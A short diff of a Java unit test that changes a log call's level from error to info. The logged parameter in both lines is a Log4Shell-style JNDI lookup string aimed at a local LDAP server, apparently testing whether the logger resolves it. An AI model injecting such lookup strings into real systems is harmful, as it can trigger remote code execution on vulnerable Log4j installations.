@@ -16,7 +16,7 @@ public class UtilsTest {
 	@Test
 	public void util() {
 
-		log.error("params: {}", "${jndi:ldap://127.0.0.1:1389/Log4jTest}");
+		log.info("params: {}", "${jndi:ldap://127.0.0.1:1389/Log4jTest}");
 	}
 
 }
